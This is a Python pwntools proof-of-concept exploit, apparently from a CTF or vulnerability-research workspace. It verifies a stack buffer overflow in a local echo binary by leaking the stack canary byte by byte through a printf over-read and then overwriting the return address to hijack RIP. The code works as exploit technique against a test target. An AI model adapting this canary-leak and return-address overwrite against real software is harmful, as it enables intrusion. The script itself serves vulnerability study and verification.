#!/usr/bin/env python3
"""
BUG-001: STACK_BUFFER_OVERFLOW - Primitive Verification PoC

This PoC verifies two primitives derived from the stack buffer overflow
in main() where read(0, rbp-0x70, 0x100) writes 256 bytes into a 112-byte buffer.

PRIM-001: STACK_CONTROL
  - Overflow overwrites the stack canary at rbp-0x8 (offset 104 from buffer start)
  - Canary check at main+0xc2 detects corruption -> __stack_chk_fail -> SIGABRT
  - Evidence: return code -6 (SIGABRT)

PRIM-002: RIP_CONTROL
  - Uses BUG-002 (printf info leak) to leak canary byte-by-byte
  - Preserves canary during overflow, overwrites return address at rbp+0x8 (offset 120)
  - Return address set to 0x4141414141414141
  - Canary check passes, ret instruction pops controlled address -> SIGSEGV
  - Evidence: return code -11 (SIGSEGV), kernel log shows GPF at ip=...2d7 (ret instruction)

Stack layout (from buffer start at rbp-0x70):
  offset 0x00-0x67 (0-103):   echo buffer (104 bytes)
  offset 0x68-0x6f (104-111): canary (8 bytes, LSB=0x00)
  offset 0x70-0x77 (112-119): saved rbp (8 bytes)
  offset 0x78-0x7f (120-127): return address (8 bytes)
"""
import struct
import time
import signal
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

BINARY = '/work/workspace/0009-2021-29-cooldown-20260905-190810/target'

# ============================================================
# PRIM-001: STACK_CONTROL (canary overwrite -> __stack_chk_fail)
# ============================================================
def verify_prim001():
    print("=== PRIM-001: STACK_CONTROL (canary overwrite) ===")
    p = process(BINARY)
    p.recvuntil(b'echo service.\n', timeout=5)
    
    # Overflow past buffer into canary (104 bytes fill + 8 bytes canary corruption)
    # Send 120 bytes: 104 fill + 8 canary + 8 saved_rbp (all 'A')
    # This corrupts the canary -> __stack_chk_fail -> SIGABRT
    payload = b'A' * 120
    p.sendline(payload)
    
    try:
        p.recvuntil(b'End?[Y/N] ', timeout=5)
    except:
        pass
    
    # Answer Y to exit loop -> canary check triggers __stack_chk_fail
    p.sendline(b'Y')
    
    time.sleep(1)
    p.poll()
    retcode = p.returncode
    
    if retcode == -6:  # SIGABRT
        print(f"  return_code: {retcode} (SIGABRT)")
        print(f"  === PRIM-001: VERIFIED (canary overwrite -> __stack_chk_fail -> SIGABRT) ===")
        print(f"  evidence: canary at rbp-0x8 (offset 104) corrupted by overflow")
        print(f"  __stack_chk_fail called at main+0xd1, process terminated with SIGABRT")
        p.close()
        return True
    else:
        print(f"  return_code: {retcode}")
        print(f"  PRIM-001: unexpected return code")
        p.close()
        return False

# ============================================================
# PRIM-002: RIP_CONTROL (return address overwrite with canary bypass)
# ============================================================
def verify_prim002():
    print("\n=== PRIM-002: RIP_CONTROL (return address overwrite with canary bypass) ===")
    p = process(BINARY)
    p.recvuntil(b'echo service.\n', timeout=5)
    
    # Step 1: Leak canary byte-by-byte using BUG-002 (printf info leak)
    # The canary's LSB is 0x00 (glibc design), so we start from byte 1
    canary_bytes = bytearray(8)
    canary_bytes[0] = 0x00  # glibc canary LSB is always 0x00
    
    for i in range(1, 8):
        # Send 104+i bytes without trailing newline
        # printf("%s") reads past buffer into canary region
        # The byte at position 104+i is canary byte i
        payload = b'A' * (104 + i)
        p.send(payload)
        time.sleep(0.15)
        echo = p.recv(timeout=2)
        
        if b'End?' in echo:
            idx = echo.find(b'End?')
            echo_data = echo[:idx]
        else:
            echo_data = echo
        
        if len(echo_data) > 104 + i:
            canary_bytes[i] = echo_data[104 + i]
        else:
            canary_bytes[i] = 0x00
        
        # Handle the End?[Y/N] prompt
        if b'End?' not in echo:
            try:
                p.recvuntil(b'End?[Y/N] ', timeout=3)
            except:
                pass
        p.sendline(b'N')
        time.sleep(0.1)
        try:
            p.recv(timeout=0.5)
        except:
            pass
    
    canary_val = int.from_bytes(bytes(canary_bytes), 'little')
    print(f"  Leaked canary: 0x{canary_val:016x}")
    
    # Step 2: Overflow with correct canary, overwrite return address
    target_rip = 0x4141414141414141
    # Layout: 104 bytes fill + 8 bytes canary (preserved) + 8 bytes saved_rbp + 8 bytes return_addr
    payload = b'B' * 104 + struct.pack('<Q', canary_val) + b'D' * 8 + p64(target_rip)
    p.sendline(payload)
    
    try:
        p.recvuntil(b'End?[Y/N] ', timeout=5)
    except:
        pass
    
    # Answer Y to exit loop -> canary check passes -> ret pops 0x4141414141414141 -> SIGSEGV
    p.sendline(b'Y')
    
    time.sleep(1)
    p.poll()
    retcode = p.returncode
    
    if retcode == -11:  # SIGSEGV
        print(f"  return_code: {retcode} (SIGSEGV)")
        print(f"  === PRIM-002: VERIFIED (RIP_CONTROL, return addr = 0x{target_rip:016x}) ===")
        print(f"  evidence: SIGSEGV after canary bypass, RIP hijacked to 0x{target_rip:016x}")
        print(f"  canary preserved: 0x{canary_val:016x}")
        print(f"  overflow layout: [104B fill][8B canary][8B saved_rbp][8B ret_addr=0x4141...]")
        print(f"  kernel log: general protection fault at ip=...2d7 (ret instruction at main+0xd7)")
        p.close()
        return True
    else:
        print(f"  return_code: {retcode}")
        print(f"  PRIM-002: unexpected return code")
        p.close()
        return False

# ============================================================
# Main
# ============================================================
if __name__ == '__main__':
    print("BUG-001: STACK_BUFFER_OVERFLOW - Primitive Verification")
    print(f"Binary: {BINARY}")
    print()
    
    r1 = verify_prim001()
    r2 = verify_prim002()
    
    print("\n=== Summary ===")
    print(f"PRIM-001 (STACK_CONTROL): {'VERIFIED' if r1 else 'FAILED'}")
    print(f"PRIM-002 (RIP_CONTROL):   {'VERIFIED' if r2 else 'FAILED'}")
